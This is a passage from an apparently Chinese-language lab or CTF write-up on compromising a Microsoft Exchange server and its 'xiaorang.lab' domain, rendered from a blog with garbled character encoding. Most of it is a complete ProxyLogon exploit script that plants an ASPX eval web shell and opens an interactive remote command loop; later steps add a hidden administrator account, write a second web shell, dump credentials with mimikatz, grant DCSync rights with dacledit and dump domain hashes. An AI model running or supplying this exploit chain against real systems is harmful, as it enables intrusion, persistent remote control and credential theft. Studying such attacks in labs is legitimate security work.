class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">fuzz_email = [<span class="string">&#x27;administrator&#x27;</span>, <span class="string">&#x27;webmaste&#x27;</span>, <span class="string">&#x27;support&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;contact&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;test2&#x27;</span>, <span class="string">&#x27;test01&#x27;</span>, <span class="string">&#x27;test1&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;sysadmin&#x27;</span>, <span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;noreply&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;no-reply&#x27;</span>]</span><br><span class="line"></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line">user_agent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;</span></span><br><span class="line"></span><br><span class="line">shell_path = <span class="string">&quot;Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\test11.aspx&quot;</span></span><br><span class="line">shell_absolute_path = <span class="string">&quot;\\\\127.0.0.1\\c$\\%s&quot;</span> % shell_path</span><br><span class="line"><span class="comment"># webshell-é©¬å­å†…å®¹</span></span><br><span class="line">shell_content = <span class="string">&#x27;&lt;script language=&quot;JScript&quot; runat=&quot;server&quot;&gt; function Page_Load()&#123;/**/eval(Request[&quot;code&quot;],&quot;unsafe&quot;);&#125;&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">final_shell = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">id_generator</span>(<span class="params">size=<span class="number">6</span>, chars=string.ascii_lowercase + string.digits</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(chars) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&#x27;Example: python exp.py -u 127.0.0.1 -user administrator -suffix @ex.com\nå¦‚æœä¸æ¸…æ¥šç”¨æˆ·åï¼Œå¯ä¸å¡«å†™-userå‚æ•°ï¼Œå°†è‡ªåŠ¨Fuzzç”¨æˆ·åã€‚&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-user&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;exist email&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-suffix&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;email suffix&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    target = args.u</span><br><span class="line">    suffix = args.suffix</span><br><span class="line">    <span class="keyword">if</span> suffix == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¯·è¾“å…¥suffix&quot;</span>)</span><br><span class="line"></span><br><span class="line">    exist_email = args.user</span><br><span class="line">    <span class="keyword">if</span> exist_email:</span><br><span class="line">        fuzz_email.insert(<span class="number">0</span>, exist_email)</span><br><span class="line">    random_name = id_generator(<span class="number">4</span>) + <span class="string">&quot;.js&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ç›®æ ‡ Exchange Server: &quot;</span> + target)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> fuzz_email:</span><br><span class="line">        new_email = i+suffix</span><br><span class="line">        autoDiscoverBody = <span class="string">&quot;&quot;&quot;&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">      &lt;EMailAddress&gt;%s&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">&lt;/Autodiscover&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % new_email</span><br><span class="line">        <span class="comment"># print(&quot;get FQDN&quot;)</span></span><br><span class="line">        FQDN = <span class="string">&quot;EXCHANGE01&quot;</span></span><br><span class="line">        ct = requests.get(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=localhost~1942062522&quot;</span>,</span><br><span class="line">                                                                            <span class="string">&quot;User-Agent&quot;</span>: user_agent&#125;,</span><br><span class="line">                      verify=<span class="literal">False</span>, proxies=proxies)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;X-CalculatedBETarget&quot;</span> <span class="keyword">in</span> ct.headers <span class="keyword">and</span> <span class="string">&quot;X-FEServer&quot;</span> <span class="keyword">in</span> ct.headers:</span><br><span class="line">            FQDN = ct.headers[<span class="string">&quot;X-FEServer&quot;</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;got FQDN:&quot;</span> + FQDN)</span><br><span class="line"></span><br><span class="line">        ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=%s/autodiscover/autodiscover.xml?a=~1941962757;&quot;</span> % FQDN,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: user_agent&#125;,</span><br><span class="line">            data=autoDiscoverBody,</span><br><span class="line">            proxies=proxies,</span><br><span class="line">            verify=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ct.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(ct.status_code)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Autodiscover Error!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;LegacyDN&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(ct.content):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Can not get LegacyDN!&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            legacyDn = <span class="built_in">str</span>(ct.content).split(<span class="string">&quot;&lt;LegacyDN&gt;&quot;</span>)[</span><br><span class="line">                <span class="number">1</span>].split(<span class="string">r&quot;&lt;/LegacyDN&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got DN: &quot;</span> + legacyDn)</span><br><span class="line"></span><br><span class="line">            mapi_body = legacyDn + \</span><br><span class="line">                <span class="string">&quot;\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&amp;a=~1942062522;&quot;</span> % FQDN,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/mapi-http&quot;</span>,</span><br><span class="line">                <span class="string">&quot;X-Requesttype&quot;</span>: <span class="string">&quot;Connect&quot;</span>,</span><br><span class="line">                <span class="string">&quot;X-Clientinfo&quot;</span>: <span class="string">&quot;&#123;2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;X-Clientapplication&quot;</span>: <span class="string">&quot;Outlook/15.0.4815.1002&quot;</span>,</span><br><span class="line">                <span class="string">&quot;X-Requestid&quot;</span>: <span class="string">&quot;&#123;E2EA6C1C-E61B-49E9-9CFB-38184F907552&#125;:123456&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line">            &#125;,</span><br><span class="line">                data=mapi_body,</span><br><span class="line">                verify=<span class="literal">False</span>,</span><br><span class="line">                proxies=proxies</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">200</span> <span class="keyword">or</span> <span class="string">&quot;act as owner of a UserMailbox&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(ct.content):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Mapi Error!&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            sid = <span class="built_in">str</span>(ct.content).split(<span class="string">&quot;with SID &quot;</span>)[</span><br><span class="line">                <span class="number">1</span>].split(<span class="string">&quot; and MasterAccountSid&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got SID: &quot;</span> + sid)</span><br><span class="line">            sid = sid.replace(sid.split(<span class="string">&quot;-&quot;</span>)[-<span class="number">1</span>], <span class="string">&quot;500&quot;</span>)</span><br><span class="line"></span><br><span class="line">            proxyLogon_request = <span class="string">&quot;&quot;&quot;&lt;r at=&quot;Negotiate&quot; ln=&quot;john&quot;&gt;&lt;s&gt;%s&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-1-0&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-2&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-11&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-15&lt;/s&gt;&lt;s a=&quot;3221225479&quot; t=&quot;1&quot;&gt;S-1-5-5-0-6948923&lt;/s&gt;&lt;/r&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % sid</span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;&quot;</span> % FQDN,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;msExchLogonMailbox&quot;</span>: <span class="string">&quot;S-1-5-20&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line">            &#125;,</span><br><span class="line">                data=proxyLogon_request,</span><br><span class="line">                proxies=proxies,</span><br><span class="line">                verify=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">241</span> <span class="keyword">or</span> <span class="keyword">not</span> <span class="string">&quot;set-cookie&quot;</span> <span class="keyword">in</span> ct.headers:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Proxylogon Error!&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            sess_id = ct.headers[<span class="string">&#x27;set-cookie&#x27;</span>].split(</span><br><span class="line">                <span class="string">&quot;ASP.NET_SessionId=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            msExchEcpCanary = ct.headers[<span class="string">&#x27;set-cookie&#x27;</span>].split(<span class="string">&quot;msExchEcpCanary=&quot;</span>)[</span><br><span class="line">                <span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got session id: &quot;</span> + sess_id)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got canary: &quot;</span> + msExchEcpCanary)</span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="comment"># &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot; % (</span></span><br><span class="line">                <span class="comment"># FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),</span></span><br><span class="line"></span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Admin@&#123;server_name&#125;:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&amp;schema=VirtualDirectory&amp;msExchEcpCanary=&#123;msExchEcpCanary&#125;&amp;a=~1942062522; ASP.NET_SessionId=&#123;sess_id&#125;; msExchEcpCanary=&#123;msExchEcpCanary1&#125;&quot;</span>.</span><br><span class="line">                            <span class="built_in">format</span>(server_name=FQDN, msExchEcpCanary1=msExchEcpCanary, sess_id=sess_id,</span><br><span class="line">                                    msExchEcpCanary=msExchEcpCanary),</span><br><span class="line">                            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;msExchLogonMailbox&quot;</span>: <span class="string">&quot;S-1-5-20&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line"></span><br><span class="line">                            &#125;,</span><br><span class="line">                            json=&#123;<span class="string">&quot;filter&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;Parameters&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,</span><br><span class="line">                                                <span class="string">&quot;SelectedView&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;SelectedVDirType&quot;</span>: <span class="string">&quot;OAB&quot;</span>&#125;&#125;, <span class="string">&quot;sort&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">                            verify=<span class="literal">False</span>,</span><br><span class="line">                            proxies=proxies</span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;GetOAB Error!&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">            oabId = <span class="built_in">str</span>(ct.content).split(<span class="string">&#x27;&quot;RawIdentity&quot;:&quot;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got OAB id: &quot;</span> + oabId)</span><br><span class="line"></span><br><span class="line">            oab_json = &#123;<span class="string">&quot;identity&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;Identity:ECP&quot;</span>, <span class="string">&quot;DisplayName&quot;</span>: <span class="string">&quot;OAB (Default Web Site)&quot;</span>, <span class="string">&quot;RawIdentity&quot;</span>: oabId&#125;,</span><br><span class="line">                        <span class="string">&quot;properties&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;Parameters&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,</span><br><span class="line">                                        <span class="string">&quot;ExternalUrl&quot;</span>: <span class="string">&quot;http://ffff/#%s&quot;</span> % shell_content&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot;</span> % (</span><br><span class="line">                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),</span><br><span class="line">                <span class="string">&quot;msExchLogonMailbox&quot;</span>: <span class="string">&quot;S-1-5-20&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line">            &#125;,</span><br><span class="line">                json=oab_json,</span><br><span class="line">                proxies=proxies,</span><br><span class="line">                verify=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Set external url Error!&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            reset_oab_body = &#123;<span class="string">&quot;identity&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;Identity:ECP&quot;</span>, <span class="string">&quot;DisplayName&quot;</span>: <span class="string">&quot;OAB (Default Web Site)&quot;</span>, <span class="string">&quot;RawIdentity&quot;</span>: oabId&#125;,</span><br><span class="line">                            <span class="string">&quot;properties&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;Parameters&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,</span><br><span class="line">                                                <span class="string">&quot;FilePathName&quot;</span>: shell_absolute_path&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot;</span> % (</span><br><span class="line">                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),</span><br><span class="line">                <span class="string">&quot;msExchLogonMailbox&quot;</span>: <span class="string">&quot;S-1-5-20&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line">            &#125;,</span><br><span class="line">                json=reset_oab_body,</span><br><span class="line">                proxies=proxies,</span><br><span class="line">                verify=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;å†™å…¥shellå¤±è´¥&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">            shell_url = <span class="string">&quot;https://&quot;</span>+target+<span class="string">&quot;/owa/auth/test11.aspx&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æˆåŠŸå†™å…¥shellï¼š&quot;</span> + shell_url)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ä¸‹é¢éªŒè¯shellæ˜¯å¦ok&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;code=Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;whoami&quot;).StdOut.ReadAll());&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨è¯·æ±‚shell&quot;</span>)</span><br><span class="line">            <span class="keyword">import</span> time</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            data = requests.post(shell_url, data=&#123;</span><br><span class="line">                                <span class="string">&quot;code&quot;</span>: <span class="string">&quot;Response.Write(new ActiveXObject(\&quot;WScript.Shell\&quot;).exec(\&quot;whoami\&quot;).StdOut.ReadAll());&quot;</span>&#125;, verify=<span class="literal">False</span>, proxies=proxies)</span><br><span class="line">            <span class="keyword">if</span> data.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;å†™å…¥shellå¤±è´¥&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;shell:&quot;</span>+data.text.split(<span class="string">&quot;OAB (Default Web Site)&quot;</span>)</span><br><span class="line">                    [<span class="number">0</span>].replace(<span class="string">&quot;Name                            : &quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+]ç”¨æˆ·å: &#x27;</span>+ new_email)</span><br><span class="line">                final_shell = shell_url</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-]ç”¨æˆ·å: &#x27;</span>+new_email)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=============================&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> final_shell:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ä¸‹é¢å¯ç”¨äº¤äº’å¼shell&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        input_cmd = <span class="built_in">input</span>(<span class="string">&quot;[#] command: &quot;</span>)</span><br><span class="line">        data=&#123;<span class="string">&quot;code&quot;</span>: <span class="string">&quot;&quot;&quot;Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;cmd /c %s&quot;).stdout.readall())&quot;&quot;&quot;</span> % input_cmd&#125;</span><br><span class="line">        ct = requests.post(</span><br><span class="line">            final_shell,</span><br><span class="line">            data=data,verify=<span class="literal">False</span>, proxies=proxies)</span><br><span class="line">        <span class="keyword">if</span> ct.status_code != <span class="number">200</span> <span class="keyword">or</span> <span class="string">&quot;OAB (Default Web Site)&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ct.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Failed to execute shell command&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            shell_response = ct.text.split(</span><br><span class="line">                <span class="string">&quot;Name                            :&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(shell_response)</span><br></pre></td></tr></table></figure><p>æ·»åŠ ç”¨æˆ·ä»¥rdp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Chu0 <span class="built_in">whoami</span>@666 /add</span><br><span class="line">net localgroup administrators Chu0 /add</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‹¿åˆ°flag2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator.XIAORANG\flag\flag02.txt</span><br></pre></td></tr></table></figure><h2 id="flag03">flag03</h2><p>å†™ä¸ªshellè¿›å»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt; &lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;pass&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure><p>å†™å®Œshellä¹‹åå°±å¯ä»¥ç”¨systemæƒé™ä¸Šbloodhoundè¿›è¡Œä¸€æ³¢ä¿¡æ¯æ”¶é›†äº†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820211018740.png" alt="image-20240820211018740"></p><p>å‘ç°XIAORANG-EXC01å¯¹äºåŸŸå†…ç”¨æˆ·æœ‰WriteDACLæƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æœºå™¨è´¦æˆ·ç»™è‡ªå·±ä¸€ä¸ªdcsyncæƒé™ï¼Œè¿›è€Œè·å¾—åŸŸç®¡å“ˆå¸Œ</p><p>å…ˆè·å–æœºå™¨ç”¨æˆ·å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;&quot;</span>privilege::debug<span class="string">&quot;&quot;</span> <span class="string">&quot;&quot;</span>sekurlsa::logonpasswords<span class="string">&quot;&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* Username : XIAORANG-EXC01$</span><br><span class="line">* Domain   : XIAORANG</span><br><span class="line">* NTLM     : b898bfd97adaeac3165e21cc0c83e018</span><br></pre></td></tr></table></figure><p>èµ‹äºˆæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dacledit.py xiaorang.lab/XIAORANG-EXC01$ -hashes :b898bfd97adaeac3165e21cc0c83e018 -action write -rights DCSync -principal XIAORANG-EXC01$ -target-dn <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -dc-ip 172.22.3.2</span><br></pre></td></tr></table></figure><p>dumpå“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span 